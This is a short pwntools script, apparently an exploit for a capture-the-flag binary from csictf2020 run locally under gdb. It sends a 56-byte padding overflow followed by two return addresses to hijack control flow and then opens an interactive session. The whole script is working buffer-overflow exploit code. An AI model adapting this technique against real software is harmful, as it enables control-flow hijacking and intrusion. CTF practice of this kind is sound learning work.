from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/3_csictf2020_pwn0x1/csictf2020_pwn0x1")
pwn.gdb.attach(p)
p.recvuntil(b'Please pour me some coffee:\n')
payload = b"\x00" * 56
payload += p64(0x40101a) + p64(0x4011dc)
payload += b"\n"
p.send(payload)
p.interactive()
